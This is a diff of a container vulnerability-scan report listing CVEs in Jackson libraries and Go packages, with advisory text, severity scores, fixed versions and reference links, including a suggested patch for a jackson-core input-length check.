+│                       │     │                                if (_inputPtr >= _inputEnd) {
+│                       │     │                                    _minorState = MINOR_NUMBER_INTEGER_DIGITS;
+│                       │     │                                    _textBuffer.setCurrentLength(outPtr);
+│                       │     │                   +               
+│                       │     │                   _streamReadConstraints.validateIntegerLength(outPtr +
+│                       │     │                   negMod);
+│                       │     │                                    return _updateTokenToNA();
+│                       │     │                                }
+│                       │     │                   Note: `_setIntLength` itself can't be used as-is because it
+│                       │     │                   also assigns `_intLength`, and `_intLength` must not be set
+│                       │     │                   until the integer is truly complete (subsequent fraction
+│                       │     │                   handling reads `_intLength`). The minimal fix is to call only
+│                       │     │                    the validator, as shown.
+│                       │     │                   Apply the same one-line insertion before each `return
+│                       │     │                   _updateTokenToNA();` that exits with `_minorState =
+│                       │     │                   MINOR_NUMBER_INTEGER_DIGITS`. The sites are listed above (12
+│                       │     │                   lines total).
+│                       │     │                   Alternatively, a heavier refactor: also gate
+│                       │     │                   `_textBuffer.expandCurrentSegment()` calls inside the
+│                       │     │                   digit-accumulation loops on `outPtr < maxNumberLength` so
+│                       │     │                   that the validator fires at the moment the buffer would be
+│                       │     │                   enlarged past the limit, rather than waiting for the next
+│                       │     │                   chunk boundary. Either approach is sufficient.
+│                       │     │                   ## Credit
+│                       │     │                   Reported by `tonghuaroot` (`tonghuaroot@gmail.com`). Variant
+│                       │     │                   hunt against the Feb 2026 fix for GHSA-72hv-8253-57qq. 
+│                       │     ├ Severity        : HIGH 
+│                       │     ├ VendorSeverity   ─ ghsa: 3 
+│                       │     ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:
+│                       │     │                         │            N/VA:H/SC:N/SI:N/SA:N 
+│                       │     │                         ╰ V40Score : 8.7 
+│                       │     ├ References       ╭ [0]: https://github.com/FasterXML/jackson-core 
+│                       │     │                  ├ [1]: https://github.com/FasterXML/jackson-core/commit/050b42
+│                       │     │                  │      9804dce2a7e08f0be1b0b4c3d040fdb9cd 
+│                       │     │                  ├ [2]: https://github.com/FasterXML/jackson-core/commit/4cdd52
+│                       │     │                  │      9749da396cc7edf6d4a2aad41d47902641 
+│                       │     │                  ├ [3]: https://github.com/FasterXML/jackson-core/commit/c5941e
+│                       │     │                  │      5aae7fd5aeac55d66933cfb82b9aabeef8 
+│                       │     │                  ├ [4]: https://github.com/FasterXML/jackson-core/pull/1611 
+│                       │     │                  ╰ [5]: https://github.com/FasterXML/jackson-core/security/advi
+│                       │     │                         sories/GHSA-r7wm-3cxj-wff9 
+│                       │     ├ PublishedDate   : 2026-07-21T21:58:53Z 
+│                       │     ╰ LastModifiedDate: 2026-07-21T21:58:53Z 
+│                       ├ [1] ╭ VulnerabilityID : CVE-2026-54515 
+│                       │     ├ VendorIDs        ─ [0]: GHSA-5jmj-h7xm-6q6v 
+│                       │     ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
+│                       │     ├ PkgPath         : openaf/openaf.jar 
+│                       │     ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind@
+│                       │     │                  │       2.22.0 
+│                       │     │                  ╰ UID : c3b2e55f064f8b6 
+│                       │     ├ InstalledVersion: 2.22.0 
+│                       │     ├ FixedVersion    : 3.1.4, 2.18.9, 2.21.5, 2.22.1 
+│                       │     ├ Status          : fixed 
+│                       │     ├ Layer            ╭ Digest: sha256:357710754a797a0b8d7465470fd490cec4d7a79976f5b
+│                       │     │                  │         16137b13867ed9515ce 
+│                       │     │                  ╰ DiffID: sha256:f7bda0de7895baf23a3ecc70b50bb8bc7be3642a95a7a
+│                       │     │                            246a8f094628c9083e0 
+│                       │     ├ SeveritySource  : ghsa 
+│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54515 
+│                       │     ├ DataSource       ╭ ID  : ghsa 
+│                       │     │                  ├ Name: GitHub Security Advisory Maven 
+│                       │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
+│                       │     │                          osystem%3Amaven 
+│                       │     ├ Fingerprint     : sha256:23d57f4ec4804139b6e91e350259d2067a435e8afc0d79cac56e22
+│                       │     │                   e8d81dc5a4 
+│                       │     ├ Title           : jackson-databind: jackson-databind: Ignored properties can be
+│                       │     │                    unexpectedly modified 
+│                       │     ├ Description     : jackson-databind contains the general-purpose data-binding
+│                       │     │                   functionality and tree-model for Jackson Data Processor. From
+│                       │     │                    2.8.0 until 2.18.9, 2.21.5, and 3.1.4, in
+│                       │     │                   BeanDeserializerBase.createContextual(), per-property
+│                       │     │                   @JsonIgnoreProperties exclusions are applied by
+│                       │     │                   _handleByNameInclusion(), producing a contextual deserializer
+│                       │     │                    whose BeanPropertyMap has the ignored properties removed.
+│                       │     │                   The subsequent per-property case-insensitivity block
+│                       │     │                   (triggered by
+│                       │     │                   @JsonFormat(ACCEPT_CASE_INSENSITIVE_PROPERTIES)) rebuilds
+│                       │     │                   from this._beanProperties (the original, unfiltered map)
+│                       │     │                   instead of contextual._beanProperties, then overwrites the
+│                       │     │                   filtered map — restoring every property
+│                       │     │                   _handleByNameInclusion had just removed. The ignored property
+│                       │     │                    becomes writable again. This vulnerability is fixed in
+│                       │     │                   2.18.9, 2.21.5, and 3.1.4. 
+│                       │     ├ Severity        : MEDIUM 
+│                       │     ├ CweIDs           ─ [0]: CWE-915 
+│                       │     ├ VendorSeverity   ╭ amazon: 3 
+│                       │     │                  ├ ghsa  : 2 
+│                       │     │                  ╰ redhat: 2 
+│                       │     ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/
+│                       │     │                  │        │           A:N 
+│                       │     │                  │        ╰ V3Score : 5.3 
+│                       │     │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/
+│                       │     │                           │           A:N 
+│                       │     │                           ╰ V3Score : 5.3 
+│                       │     ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-54515 
+│                       │     │                  ├ [1]: https://github.com/FasterXML/jackson-databind 
+│                       │     │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/0e
+│                       │     │                  │      1b0b211f7a53baa62ba2f4c9bd006c7bf4d5fa 
+│                       │     │                  ├ [3]: https://github.com/FasterXML/jackson-databind/issues/5962 
+│                       │     │                  ├ [4]: https://github.com/FasterXML/jackson-databind/issues/5964 
+│                       │     │                  ├ [5]: https://github.com/FasterXML/jackson-databind/security/
+│                       │     │                  │      advisories/GHSA-5jmj-h7xm-6q6v 
+│                       │     │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-54515 
+│                       │     │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2026-54515 
+│                       │     ├ PublishedDate   : 2026-06-23T21:17:02.597Z 
+│                       │     ╰ LastModifiedDate: 2026-06-29T13:38:59.057Z 
+│                       ╰ [2] ╭ VulnerabilityID : CVE-2026-59889 
+│                             ├ VendorIDs        ─ [0]: GHSA-5gvw-p9qm-jgwh 
 │                             ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
 │                             ├ PkgPath         : openaf/openaf.jar 
 │                             ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind@
 │                             │                  │       2.22.0 
 │                             │                  ╰ UID : c3b2e55f064f8b6 
 │                             ├ InstalledVersion: 2.22.0 
-│                             ├ FixedVersion    : 3.1.4, 2.18.9, 2.21.5, 2.22.1 
+│                             ├ FixedVersion    : 2.21.5, 2.18.9, 2.22.1 
 │                             ├ Status          : fixed 
 │                             ├ Layer            ╭ Digest: sha256:357710754a797a0b8d7465470fd490cec4d7a79976f5b
 │                             │                  │         16137b13867ed9515ce 
 │                             │                  ╰ DiffID: sha256:f7bda0de7895baf23a3ecc70b50bb8bc7be3642a95a7a
 │                             │                            246a8f094628c9083e0 
 │                             ├ SeveritySource  : ghsa 
-│                             ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54515 
+│                             ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59889 
 │                             ├ DataSource       ╭ ID  : ghsa 
 │                             │                  ├ Name: GitHub Security Advisory Maven 
 │                             │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
 │                             │                          osystem%3Amaven 
-│                             ├ Fingerprint     : sha256:23d57f4ec4804139b6e91e350259d2067a435e8afc0d79cac56e22
-│                             │                   e8d81dc5a4 
-│                             ├ Title           : jackson-databind: jackson-databind: Ignored properties can be
-│                             │                    unexpectedly modified 
+│                             ├ Fingerprint     : sha256:cc9f434254b9469fc8d9b3e8cbafab96fb21a3296606187cc14cc2
+│                             │                   b8db9c1d00 
+│                             ├ Title           : jackson-databind: @JsonView ypassed for @JsonUnwrapped
+│                             │                   container properties on deserialization 
 │                             ├ Description     : jackson-databind contains the general-purpose data-binding
 │                             │                   functionality and tree-model for Jackson Data Processor. From
-│                             │                    2.8.0 until 2.18.9, 2.21.5, and 3.1.4, in
-│                             │                   BeanDeserializerBase.createContextual(), per-property
-│                             │                   @JsonIgnoreProperties exclusions are applied by
-│                             │                   _handleByNameInclusion(), producing a contextual deserializer
-│                             │                    whose BeanPropertyMap has the ignored properties removed.
-│                             │                   The subsequent per-property case-insensitivity block
-│                             │                   (triggered by
-│                             │                   @JsonFormat(ACCEPT_CASE_INSENSITIVE_PROPERTIES)) rebuilds
-│                             │                   from this._beanProperties (the original, unfiltered map)
-│                             │                   instead of contextual._beanProperties, then overwrites the
-│                             │                   filtered map — restoring every property
-│                             │                   _handleByNameInclusion had just removed. The ignored property
-│                             │                    becomes writable again. This vulnerability is fixed in
-│                             │                   2.18.9, 2.21.5, and 3.1.4. 
+│                             │                    2.18.0 until 2.18.9, 2.21.5, 2.22.1, 3.1.5, and 3.2.1,
+│                             │                   UnwrappedPropertyHandler.processUnwrapped() replays buffered
+│                             │                   JSON for a @JsonUnwrapped property and calls
+│                             │                   prop.deserializeAndSet() without a
+│                             │                   prop.visibleInView(ctxt.getActiveView()) guard, allowing a
+│                             │                   property annotated with both @JsonView and @JsonUnwrapped to
+│                             │                   be written from attacker JSON under a less-privileged active
+│                             │                   view. This issue is fixed in versions 2.18.9, 2.21.5, 2.22.1,
+│                             │                    3.1.5, and 3.2.1. 
 │                             ├ Severity        : MEDIUM 
-│                             ├ CweIDs           ─ [0]: CWE-915 
-│                             ├ VendorSeverity   ╭ amazon: 3 
-│                             │                  ├ ghsa  : 2 
-│                             │                  ╰ redhat: 2 
-│                             ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/
-│                             │                  │        │           A:N 
-│                             │                  │        ╰ V3Score : 5.3 
-│                             │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/
-│                             │                           │           A:N 
-│                             │                           ╰ V3Score : 5.3 
-│                             ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-54515 
-│                             │                  ├ [1]: https://github.com/FasterXML/jackson-databind 
-│                             │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/0e
-│                             │                  │      1b0b211f7a53baa62ba2f4c9bd006c7bf4d5fa 
-│                             │                  ├ [3]: https://github.com/FasterXML/jackson-databind/issues/5962 
-│                             │                  ├ [4]: https://github.com/FasterXML/jackson-databind/issues/5964 
-│                             │                  ├ [5]: https://github.com/FasterXML/jackson-databind/security/
-│                             │                  │      advisories/GHSA-5jmj-h7xm-6q6v 
-│                             │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-54515 
-│                             │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2026-54515 
-│                             ├ PublishedDate   : 2026-06-23T21:17:02.597Z 
-│                             ╰ LastModifiedDate: 2026-06-29T13:38:59.057Z 
+│                             ├ CweIDs           ─ [0]: CWE-863 
+│                             ├ VendorSeverity   ─ ghsa: 2 
+│                             ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N 
+│                             │                         ╰ V3Score : 6.5 
+│                             ├ References       ╭ [0]: https://github.com/FasterXML/jackson-databind 
+│                             │                  ├ [1]: https://github.com/FasterXML/jackson-databind/commit/d6
+│                             │                  │      27a8a86fcb062429282f79f3f256f181ed2c7b 
+│                             │                  ├ [2]: https://github.com/FasterXML/jackson-databind/issues/6060 
+│                             │                  ├ [3]: https://github.com/FasterXML/jackson-databind/pull/6056 
+│                             │                  ├ [4]: https://github.com/FasterXML/jackson-databind/security/
+│                             │                  │      advisories/GHSA-5gvw-p9qm-jgwh 
+│                             │                  ╰ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-59889 
+│                             ├ PublishedDate   : 2026-07-14T21:17:06.16Z 
+│                             ╰ LastModifiedDate: 2026-07-16T16:19:15.79Z 
 ╰ [2] ╭ Target         : usr/bin/pebble 
       ├ Class          : lang-pkgs 
       ├ Type           : gobinary 
@@ -3877,46 +4321,47 @@
                         │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H
                         │      │                           │           /A:N 
                         │      │                           ╰ V3Score : 8.1 
-                        │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:34357 
+                        │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:37123 
                         │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-25681 
-                        │      │                  ├ [2] : https://bugzilla.redhat.com/2466505 
-                        │      │                  ├ [3] : https://bugzilla.redhat.com/2466507 
-                        │      │                  ├ [4] : https://bugzilla.redhat.com/2467822 
-                        │      │                  ├ [5] : https://bugzilla.redhat.com/2480756 
-                        │      │                  ├ [6] : https://bugzilla.redhat.com/2480761 
-                        │      │                  ├ [7] : https://bugzilla.redhat.com/2484207 
-                        │      │                  ├ [8] : https://bugzilla.redhat.com/show_bug.cgi?id=2480680 
-                        │      │                  ├ [9] : https://bugzilla.redhat.com/show_bug.cgi?id=2480681 
-                        │      │                  ├ [10]: https://bugzilla.redhat.com/show_bug.cgi?id=2480685 
-                        │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2480688 
-                        │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2480757 
-                        │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2480761 
-                        │      │                  ├ [14]: https://bugzilla.redhat.com/show_bug.cgi?id=2493620 
-                        │      │                  ├ [15]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
-                        │      │                  │       26-25681 
+                        │      │                  ├ [2] : https://bugzilla.redhat.com/2480680 
+                        │      │                  ├ [3] : https://bugzilla.redhat.com/2480681 
+                        │      │                  ├ [4] : https://bugzilla.redhat.com/2480685 
+                        │      │                  ├ [5] : https://bugzilla.redhat.com/2480688 
+                        │      │                  ├ [6] : https://bugzilla.redhat.com/2480757 
+                        │      │                  ├ [7] : https://bugzilla.redhat.com/2480761 
+                        │      │                  ├ [8] : https://bugzilla.redhat.com/2493620 
+                        │      │                  ├ [9] : https://bugzilla.redhat.com/show_bug.cgi?id=2480680 
+                        │      │                  ├ [10]: https://bugzilla.redhat.com/show_bug.cgi?id=2480681 
+                        │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2480685 
+                        │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2480688 
+                        │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2480757 
+                        │      │                  ├ [14]: https://bugzilla.redhat.com/show_bug.cgi?id=2480761 
+                        │      │                  ├ [15]: https://bugzilla.redhat.com/show_bug.cgi?id=2493620 
                         │      │                  ├ [16]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
-                        │      │                  │       26-27136 
+                        │      │                  │       26-25681 
                         │      │                  ├ [17]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
-                        │      │                  │       26-39829 
+                        │      │                  │       26-27136 
                         │      │                  ├ [18]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
-                        │      │                  │       26-39832 
+                        │      │                  │       26-39829 
                         │      │                  ├ [19]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
-                        │      │                  │       26-39835 
+                        │      │                  │       26-39832 
                         │      │                  ├ [20]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
-                        │      │                  │       26-42508 
+                        │      │                  │       26-39835 
                         │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+                        │      │                  │       26-42508 
+                        │      │                  ├ [22]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                         │      │                  │       26-57231 
-                        │      │                  ├ [22]: https://errata.almalinux.org/10/ALSA-2026-34357.html 
-                        │      │                  ├ [23]: https://errata.rockylinux.org/RLSA-2026:37123 
-                        │      │                  ├ [24]: https://go.dev/cl/781703 
-                        │      │                  ├ [25]: https://go.dev/issue/79574 
-                        │      │                  ├ [26]: https://groups.google.com/g/golang-announce/c/iI-mYSI
+                        │      │                  ├ [23]: https://errata.almalinux.org/9/ALSA-2026-37123.html 
+                        │      │                  ├ [24]: https://errata.rockylinux.org/RLSA-2026:37123 
+                        │      │                  ├ [25]: https://go.dev/cl/781703 
+                        │      │                  ├ [26]: https://go.dev/issue/79574 
+                        │      │                  ├ [27]: https://groups.google.com/g/golang-announce/c/iI-mYSI
                         │      │                  │       0lu8 
-                        │      │                  ├ [27]: https://linux.oracle.com/cve/CVE-2026-25681.html 
-                        │      │                  ├ [28]: https://linux.oracle.com/errata/ELSA-2026-37123.html 
-                        │      │                  ├ [29]: https://nvd.nist.gov/vuln/detail/CVE-2026-25681 
-                        │      │                  ├ [30]: https://pkg.go.dev/vuln/GO-2026-5029 
-                        │      │                  ╰ [31]: https://www.cve.org/CVERecord?id=CVE-2026-25681 
+                        │      │                  ├ [28]: https://linux.oracle.com/cve/CVE-2026-25681.html 
+                        │      │                  ├ [29]: https://linux.oracle.com/errata/ELSA-2026-37123.html 
+                        │      │                  ├ [30]: https://nvd.nist.gov/vuln/detail/CVE-2026-25681 
+                        │      │                  ├ [31]: https://pkg.go.dev/vuln/GO-2026-5029 
+                        │      │                  ╰ [32]: https://www.cve.org/CVERecord?id=CVE-2026-25681 
                         │      ├ PublishedDate   : 2026-05-22T16:16:19.863Z 
                         │      ╰ LastModifiedDate: 2026-06-17T10:25:03.343Z 
                         ├ [1]  ╭ VulnerabilityID : CVE-2026-27136 
@@ -4052,29 +4497,30 @@
                         │      │                  ├ [5] : https://access.redhat.com/errata/RHSA-2026:33150 
                         │      │                  ├ [6] : https://access.redhat.com/errata/RHSA-2026:34342 
                         │      │                  ├ [7] : https://access.redhat.com/errata/RHSA-2026:37387 
-                        │      │                  ├ [8] : https://access.redhat.com/security/cve/CVE-2026-33814 
-                        │      │                  ├ [9] : https://bugzilla.redhat.com/show_bug.cgi?id=2467815 
-                        │      │                  ├ [10]: https://github.com/golang/go/issues/78476 
-                        │      │                  ├ [11]: https://go-review.googlesource.com/c/go/+/761581 
-                        │      │                  ├ [12]: https://go-review.googlesource.com/c/net/+/761640 
-                        │      │                  ├ [13]: https://go.dev/cl/761581 
-                        │      │                  ├ [14]: https://go.dev/cl/761640 
-                        │      │                  ├ [15]: https://go.dev/issue/78476 
-                        │      │                  ├ [16]: https://groups.google.com/g/golang-announce/c/qcCIEXs
+                        │      │                  ├ [8] : https://access.redhat.com/errata/RHSA-2026:42644 
+                        │      │                  ├ [9] : https://access.redhat.com/security/cve/CVE-2026-33814 
+                        │      │                  ├ [10]: https://bugzilla.redhat.com/show_bug.cgi?id=2467815 
+                        │      │                  ├ [11]: https://github.com/golang/go/issues/78476 
+                        │      │                  ├ [12]: https://go-review.googlesource.com/c/go/+/761581 
+                        │      │                  ├ [13]: https://go-review.googlesource.com/c/net/+/761640 
+                        │      │                  ├ [14]: https://go.dev/cl/761581 
+                        │      │                  ├ [15]: https://go.dev/cl/761640 
+                        │      │                  ├ [16]: https://go.dev/issue/78476 
+                        │      │                  ├ [17]: https://groups.google.com/g/golang-announce/c/qcCIEXs
                         │      │                  │       o47M 
-                        │      │                  ├ [17]: https://linux.oracle.com/cve/CVE-2026-33814.html 
-                        │      │                  ├ [18]: https://linux.oracle.com/errata/ELSA-2026-22121.html 
-                        │      │                  ├ [19]: https://nvd.nist.gov/vuln/detail/CVE-2026-33814 
-                        │      │                  ├ [20]: https://pkg.go.dev/vuln/GO-2026-4918 
-                        │      │                  ├ [21]: https://security.access.redhat.com/data/csaf/v2/vex/2
+                        │      │                  ├ [18]: https://linux.oracle.com/cve/CVE-2026-33814.html 
+                        │      │                  ├ [19]: https://linux.oracle.com/errata/ELSA-2026-22121.html 
+                        │      │                  ├ [20]: https://nvd.nist.gov/vuln/detail/CVE-2026-33814 
+                        │      │                  ├ [21]: https://pkg.go.dev/vuln/GO-2026-4918 
+                        │      │                  ├ [22]: https://security.access.redhat.com/data/csaf/v2/vex/2
                         │      │                  │       026/cve-2026-33814.json 
-                        │      │                  ├ [22]: https://ubuntu.com/security/notices/USN-8430-1 
-                        │      │                  ├ [23]: https://ubuntu.com/security/notices/USN-8471-1 
-                        │      │                  ├ [24]: https://ubuntu.com/security/notices/USN-8472-1 
-                        │      │                  ├ [25]: https://ubuntu.com/security/notices/USN-8473-1 
-                        │      │                  ╰ [26]: https://www.cve.org/CVERecord?id=CVE-2026-33814 
+                        │      │                  ├ [23]: https://ubuntu.com/security/notices/USN-8430-1 
+                        │      │                  ├ [24]: https://ubuntu.com/security/notices/USN-8471-1 
+                        │      │                  ├ [25]: https://ubuntu.com/security/notices/USN-8472-1 
+                        │      │                  ├ [26]: https://ubuntu.com/security/notices/USN-8473-1 
+                        │      │                  ╰ [27]: https://www.cve.org/CVERecord?id=CVE-2026-33814 
                         │      ├ PublishedDate   : 2026-05-07T20:16:42.88Z 
-                        │      ╰ LastModifiedDate: 2026-07-20T12:18:43.933Z 
+                        │      ╰ LastModifiedDate: 2026-07-21T12:18:10.55Z 
                         ├ [3]  ╭ VulnerabilityID : CVE-2026-39821 
                         │      ├ VendorIDs        ─ [0]: GO-2026-5026 
                         │      ├ PkgID           : golang.org/x/net@v0.40.0 
@@ -4175,32 +4621,50 @@
                         │      │                  ├ [52]: https://access.redhat.com/errata/RHSA-2026:41036 
                         │      │                  ├ [53]: https://access.redhat.com/errata/RHSA-2026:41055 
                         │      │                  ├ [54]: https://access.redhat.com/errata/RHSA-2026:41066 
-                        │      │                  ├ [55]: https://access.redhat.com/errata/RHSA-2026:41930 
-                        │      │                  ├ [56]: https://access.redhat.com/security/cve/CVE-2026-39821 
-                        │      │                  ├ [57]: https://bugzilla.redhat.com/2480756 
-                        │      │                  ├ [58]: https://bugzilla.redhat.com/show_bug.cgi?id=2480756 
-                        │      │                  ├ [59]: https://bugzilla.redhat.com/show_bug.cgi?id=2498152 
-                        │      │                  ├ [60]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+                        │      │                  ├ [55]: https://access.redhat.com/errata/RHSA-2026:41928 
+                        │      │                  ├ [56]: https://access.redhat.com/errata/RHSA-2026:41930 
+                        │      │                  ├ [57]: https://access.redhat.com/errata/RHSA-2026:42043 
+                        │      │                  ├ [58]: https://access.redhat.com/errata/RHSA-2026:42047 
+                        │      │                  ├ [59]: https://access.redhat.com/errata/RHSA-2026:42048 
+                        │      │                  ├ [60]: https://access.redhat.com/errata/RHSA-2026:42049 
+                        │      │                  ├ [61]: https://access.redhat.com/errata/RHSA-2026:42050 
+                        │      │                  ├ [62]: https://access.redhat.com/errata/RHSA-2026:42051 
+                        │      │                  ├ [63]: https://access.redhat.com/errata/RHSA-2026:42078 
+                        │      │                  ├ [64]: https://access.redhat.com/errata/RHSA-2026:42079 
+                        │      │                  ├ [65]: https://access.redhat.com/errata/RHSA-2026:42080 
+                        │      │                  ├ [66]: https://access.redhat.com/errata/RHSA-2026:42082 
+                        │      │                  ├ [67]: https://access.redhat.com/errata/RHSA-2026:42132 
+                        │      │                  ├ [68]: https://access.redhat.com/errata/RHSA-2026:42142 
+                        │      │                  ├ [69]: https://access.redhat.com/errata/RHSA-2026:42146 
+                        │      │                  ├ [70]: https://access.redhat.com/errata/RHSA-2026:42150 
+                        │      │                  ├ [71]: https://access.redhat.com/errata/RHSA-2026:42151 
+                        │      │                  ├ [72]: https://access.redhat.com/errata/RHSA-2026:42240 
+                        │      │                  ├ [73]: https://access.redhat.com/errata/RHSA-2026:42644 
+                        │      │                  ├ [74]: https://access.redhat.com/security/cve/CVE-2026-39821 
+                        │      │                  ├ [75]: https://bugzilla.redhat.com/2480756 
+                        │      │                  ├ [76]: https://bugzilla.redhat.com/show_bug.cgi?id=2480756 
+                        │      │                  ├ [77]: https://bugzilla.redhat.com/show_bug.cgi?id=2498152 
+                        │      │                  ├ [78]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                         │      │                  │       26-39821 
-                        │      │                  ├ [61]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+                        │      │                  ├ [79]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                         │      │                  │       26-39822 
-                        │      │                  ├ [62]: https://errata.almalinux.org/10/ALSA-2026-37436.html 
-                        │      │                  ├ [63]: https://errata.rockylinux.org/RLSA-2026:37435 
-                        │      │                  ├ [64]: https://github.com/golang/go/issues/78760 
-                        │      │                  ├ [65]: https://go.dev/cl/767220 
-                        │      │                  ├ [66]: https://go.dev/issue/78760 
-                        │      │                  ├ [67]: https://groups.google.com/g/golang-announce/c/iI-mYSI
+                        │      │                  ├ [80]: https://errata.almalinux.org/9/ALSA-2026-37435.html 
+                        │      │                  ├ [81]: https://errata.rockylinux.org/RLSA-2026:37435 
+                        │      │                  ├ [82]: https://github.com/golang/go/issues/78760 
+                        │      │                  ├ [83]: https://go.dev/cl/767220 
+                        │      │                  ├ [84]: https://go.dev/issue/78760 
+                        │      │                  ├ [85]: https://groups.google.com/g/golang-announce/c/iI-mYSI
                         │      │                  │       0lu8 
-                        │      │                  ├ [68]: https://linux.oracle.com/cve/CVE-2026-39821.html 
-                        │      │                  ├ [69]: https://linux.oracle.com/errata/ELSA-2026-38995.html 
-                        │      │                  ├ [70]: https://nvd.nist.gov/vuln/detail/CVE-2026-39821 
-                        │      │                  ├ [71]: https://pkg.go.dev/vuln/GO-2026-5026 
-                        │      │                  ├ [72]: https://security.access.redhat.com/data/csaf/v2/vex/2
+                        │      │                  ├ [86]: https://linux.oracle.com/cve/CVE-2026-39821.html 
+                        │      │                  ├ [87]: https://linux.oracle.com/errata/ELSA-2026-39573.html 
+                        │      │                  ├ [88]: https://nvd.nist.gov/vuln/detail/CVE-2026-39821 
+                        │      │                  ├ [89]: https://pkg.go.dev/vuln/GO-2026-5026 
+                        │      │                  ├ [90]: https://security.access.redhat.com/data/csaf/v2/vex/2
                         │      │                  │       026/cve-2026-39821.json 
-                        │      │                  ├ [73]: https://ubuntu.com/security/notices/USN-8416-1 
-                        │      │                  ╰ [74]: https://www.cve.org/CVERecord?id=CVE-2026-39821 
+                        │      │                  ├ [91]: https://ubuntu.com/security/notices/USN-8416-1 
+                        │      │                  ╰ [92]: https://www.cve.org/CVERecord?id=CVE-2026-39821 
                         │      ├ PublishedDate   : 2026-05-22T16:16:20.41Z 
-                        │      ╰ LastModifiedDate: 2026-07-20T12:18:53.62Z 
+                        │      ╰ LastModifiedDate: 2026-07-21T12:18:16.797Z 
                         ├ [4]  ╭ VulnerabilityID : CVE-2025-47911 
                         │      ├ VendorIDs        ─ [0]: GO-2026-4440 
                         │      ├ PkgID           : golang.org/x/net@v0.40.0 
@@ -4459,9 +4923,11 @@
                         │      ├ Description     : Parsing an invalid SVCB or HTTPS RR can panic when the size
                         │      │                   of a parameter value overflows the message buffer. 
                         │      ├ Severity        : UNKNOWN 
-                        │      ╰ References       ╭ [0]: https://go.dev/cl/786345 
-                        │                         ├ [1]: https://go.dev/issue/79795 
-                        │                         ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5942 
+                        │      ├ References       ╭ [0]: https://go.dev/cl/786345 
+                        │      │                  ├ [1]: https://go.dev/issue/79795 
+                        │      │                  ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5942 
+                        │      ├ PublishedDate   : 2026-07-21T20:17:01.213Z 
+                        │      ╰ LastModifiedDate: 2026-07-21T20:17:01.213Z 
                         ├ [10] ╭ VulnerabilityID : CVE-2026-39824 
                         │      ├ VendorIDs        ─ [0]: GO-2026-5024 
                         │      ├ PkgID           : golang.org/x/sys@v0.33.0 
@@ -4538,13 +5004,13 @@
                         │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:
                         │      │                            │           H/A:H 
                         │      │                            ╰ V3Score : 7.8 
-                        │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:38495 
+                        │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:38878 
                         │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-39822 
                         │      │                  ├ [2] : https://bugzilla.redhat.com/2498152 
                         │      │                  ├ [3] : https://bugzilla.redhat.com/show_bug.cgi?id=2498152 
                         │      │                  ├ [4] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                         │      │                  │       26-39822 
-                        │      │                  ├ [5] : https://errata.almalinux.org/10/ALSA-2026-38495.html 
+                        │      │                  ├ [5] : https://errata.almalinux.org/9/ALSA-2026-38878.html 
